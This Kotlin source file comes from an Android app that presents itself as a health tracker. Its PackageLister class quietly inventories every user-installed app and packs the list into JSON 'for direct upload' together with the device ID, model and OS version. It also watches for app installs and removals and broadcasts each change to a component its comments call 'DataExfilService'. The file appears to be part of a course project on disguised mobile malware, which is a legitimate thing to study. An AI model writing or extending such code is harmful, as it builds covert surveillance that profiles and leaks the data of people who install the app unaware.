package com.inf2007.healthtracker.utilities

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.content.pm.PackageInstaller
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class PackageLister(private val context: Context) {
    companion object {
        private const val TAG = "PackageLister"
        private const val PREFS_NAME = "package_lister"

        // Action for broadcasting new app installs
        const val ACTION_APP_INSTALLED = "com.inf2007.healthtracker.APP_INSTALLED"
        const val EXTRA_PACKAGE_NAME = "extra_package_name"
        const val EXTRA_TOTAL_APPS = "extra_total_apps"
    }

    data class PackageInfo(
        val packageName: String,
        val uid: Int,
        val appName: String
    )

    private val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    private val handler = Handler(Looper.getMainLooper())
    private var lastAppList: List<PackageInfo>? = null

    /**
     * Get only user-installed apps (non-system)
     */
    fun getUserApps(): List<PackageInfo> {
        Log.d(TAG, "========== GETTING USER INSTALLED APPS ==========")
        val userApps = mutableListOf<PackageInfo>()

        try {
            val pm = context.packageManager
            val installedPackages = pm.getInstalledApplications(
                PackageManager.GET_META_DATA or
                        PackageManager.MATCH_UNINSTALLED_PACKAGES
            )

            for (app in installedPackages) {
                try {
                    // Check if it's a user-installed app (not system)
                    val isSystem = (app.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0

                    if (!isSystem) {
                        val appName = pm.getApplicationLabel(app).toString()

                        userApps.add(PackageInfo(
                            packageName = app.packageName,
                            uid = app.uid,
                            appName = appName
                        ))
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing package ${app.packageName}", e)
                }
            }

            // Sort by package name
            userApps.sortBy { it.packageName }

            Log.i(TAG, "Found ${userApps.size} user-installed apps")

        } catch (e: Exception) {
            Log.e(TAG, "Error getting apps", e)
        }

        return userApps
    }

    /**
     * Get user apps as JSON for direct upload
     */
    fun getUserAppsAsJson(): JSONObject {
        val apps = getUserApps()
        val jsonApps = JSONArray()

        for (app in apps) {
            val appJson = JSONObject()
            appJson.put("package_name", app.packageName)
            appJson.put("uid", app.uid)
            appJson.put("app_name", app.appName)
            jsonApps.put(appJson)
        }

        val result = JSONObject()
        result.put("type", "user_apps_list")
        result.put("device_id", getDeviceId())
        result.put("device_model", Build.MODEL)
        result.put("android_version", Build.VERSION.RELEASE)
        result.put("timestamp", System.currentTimeMillis())
        result.put("total_apps", apps.size)
        result.put("apps", jsonApps)

        return result
    }

    /**
     * Save user apps list to a file
     */
    fun saveUserAppsToFile(): File? {
        return try {
            val apps = getUserApps()
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val file = File(context.filesDir, "user_apps_$timestamp.json")

            FileOutputStream(file).bufferedWriter().use { writer ->
                val json = getUserAppsAsJson()
                writer.write(json.toString(2))
            }

            Log.i(TAG, "User apps list saved to: ${file.absolutePath}")
            file

        } catch (e: Exception) {
            Log.e(TAG, "Error saving user apps list", e)
            null
        }
    }

    /**
     * Start listening for package install events
     * Call this in your service onCreate
     */
    fun startListening() {
        Log.d(TAG, "Starting package install listener")

        // Register broadcast receiver for package installs
        val filter = IntentFilter()
        filter.addAction(Intent.ACTION_PACKAGE_ADDED)
        filter.addAction(Intent.ACTION_PACKAGE_REPLACED)
        filter.addAction(Intent.ACTION_PACKAGE_REMOVED)
        filter.addDataScheme("package")

        context.registerReceiver(packageReceiver, filter)

        try {
            val pm = context.packageManager
            val packageInstaller = pm.packageInstaller
            sessionCallback?.let { callback ->
                packageInstaller.registerSessionCallback(callback, handler)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error registering session callback", e)
        }

        // Initial scan
        lastAppList = getUserApps()
        val file = saveUserAppsToFile()

        // Broadcast initial list
        broadcastAppList(lastAppList!!)
    }

    /**
     * Stop listening for package installs
     */
    fun stopListening() {
        Log.d(TAG, "Stopping package install listener")
        try {
            context.unregisterReceiver(packageReceiver)

            try {
                val pm = context.packageManager
                val packageInstaller = pm.packageInstaller
                sessionCallback?.let { callback ->
                    packageInstaller.unregisterSessionCallback(callback)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error unregistering session callback", e)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
    }

    private val packageReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            when (intent.action) {
                Intent.ACTION_PACKAGE_ADDED,
                Intent.ACTION_PACKAGE_REPLACED -> {
                    val packageName = intent.data?.schemeSpecificPart
                    if (packageName != null) {
                        Log.i(TAG, "Package installed/replaced: $packageName")

                        // Wait a bit for the package to settle
                        handler.postDelayed({
                            val currentApps = getUserApps()
                            val newApps = if (lastAppList != null) {
                                currentApps.filter { app ->
                                    lastAppList?.none { it.packageName == app.packageName } == true
                                }
                            } else {
                                currentApps
                            }

                            if (newApps.isNotEmpty()) {
                                Log.i(TAG, "New apps detected: ${newApps.size}")
                                lastAppList = currentApps
                                val file = saveUserAppsToFile()

                                // Broadcast to DataExfilService
                                val broadcastIntent = Intent(ACTION_APP_INSTALLED)
                                broadcastIntent.putExtra(EXTRA_PACKAGE_NAME, packageName)
                                broadcastIntent.putExtra(EXTRA_TOTAL_APPS, currentApps.size)
                                context.sendBroadcast(broadcastIntent)
                            }
                        }, 3000)
                    }
                }
                Intent.ACTION_PACKAGE_REMOVED -> {
                    val packageName = intent.data?.schemeSpecificPart
                    if (packageName != null && !intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) {
                        Log.i(TAG, "Package removed: $packageName")

                        handler.postDelayed({
                            val currentApps = getUserApps()
                            lastAppList = currentApps
                            val file = saveUserAppsToFile()

                            // Broadcast to DataExfilService
                            val broadcastIntent = Intent(ACTION_APP_INSTALLED)
                            broadcastIntent.putExtra(EXTRA_PACKAGE_NAME, packageName)
                            broadcastIntent.putExtra(EXTRA_TOTAL_APPS, currentApps.size)
                            broadcastIntent.putExtra("removed", true)
                            context.sendBroadcast(broadcastIntent)
                        }, 1000)
                    }
                }
            }
        }
    }

    private val sessionCallback = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
        object : PackageInstaller.SessionCallback() {
            override fun onCreated(sessionId: Int) {
                Log.d(TAG, "Session created: $sessionId")
            }

            override fun onBadgingChanged(sessionId: Int) {
                Log.d(TAG, "Session badging changed: $sessionId")
            }

            override fun onActiveChanged(sessionId: Int, active: Boolean) {
                Log.d(TAG, "Session active changed: $sessionId, active: $active")
            }

            override fun onProgressChanged(sessionId: Int, progress: Float) {
                // Optional: log progress if needed
            }

            override fun onFinished(sessionId: Int, success: Boolean) {
                if (success) {
                    Log.i(TAG, "Package installation session finished successfully: $sessionId")
                    // Check for new apps after a delay
                    handler.postDelayed({
                        val currentApps = getUserApps()
                        val newApps = if (lastAppList != null) {
                            currentApps.filter { app ->
                                lastAppList?.none { it.packageName == app.packageName } == true
                            }
                        } else {
                            currentApps
                        }

                        if (newApps.isNotEmpty()) {
                            Log.i(TAG, "New apps detected via session: ${newApps.size}")
                            lastAppList = currentApps
                            saveUserAppsToFile()

                            // Broadcast to DataExfilService
                            val broadcastIntent = Intent(ACTION_APP_INSTALLED)
                            broadcastIntent.putExtra(EXTRA_TOTAL_APPS, currentApps.size)
                            context.sendBroadcast(broadcastIntent)
                        }
                    }, 3000)
                }
            }
        }
    } else {
        null
    }

    private fun broadcastAppList(apps: List<PackageInfo>) {
        val intent = Intent(ACTION_APP_INSTALLED)
        intent.putExtra(EXTRA_TOTAL_APPS, apps.size)
        context.sendBroadcast(intent)
    }

    private fun getDeviceId(): String {
        return try {
            android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: "unknown"
        } catch (e: Exception) {
            "unknown"
        }
    }

    fun getLastAppList(): List<PackageInfo>? = lastAppList
}